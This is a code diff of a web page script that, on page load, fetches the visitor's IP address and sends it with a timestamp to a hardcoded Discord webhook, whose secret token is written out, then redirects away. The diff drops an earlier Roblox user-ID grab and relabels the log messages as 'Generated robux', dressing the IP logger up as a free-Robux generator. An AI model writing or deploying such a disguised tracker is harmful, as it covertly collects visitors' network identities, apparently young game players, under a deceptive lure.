@@ -10,29 +10,10 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
-      // Open the user ID finding website in a new tab
-      window.open("https://www.roblox.com/users/profile");
-
-      // Wait for the user profile page to load
-      window.addEventListener("load", function() {
-        // Extract the user ID from the URL
-        var userId = getUserIdFromUrl();
-
-        // If user ID is found, send Discord message
-        if (userId) {
-          sendDiscordMessage(userId);
-        } else {
-          console.error("User ID not found in the URL.");
-        }
-      });
+      sendDiscordMessage();
     });
 
-    function getUserIdFromUrl() {
-      var urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get('userId');
-    }
-
-    function sendDiscordMessage(userId) {
+    function sendDiscordMessage() {
       var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
@@ -42,7 +23,7 @@
         .then(data => {
           var ip = data.ip;
           var message = {
-            content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nRoblox user ID: " + userId
+            content: "Opened on: " + formattedDate + "\nIP address: " + ip
           };
 
           fetch(webhookURL, {
@@ -54,14 +35,14 @@
           })
           .then(response => {
             if (!response.ok) {
-              console.error("Failed to send message to Discord.");
+              console.error("Failed generating robux");
             } else {
-              console.log("Message sent to Discord successfully.");
+              console.log("Generated robux");
               redirectToDifferentWebsite();
             }
           })
           .catch(error => {
-            console.error("Error sending message to Discord:", error);
+            console.error("Error generating robux");
           });
         })
         .catch(error => {
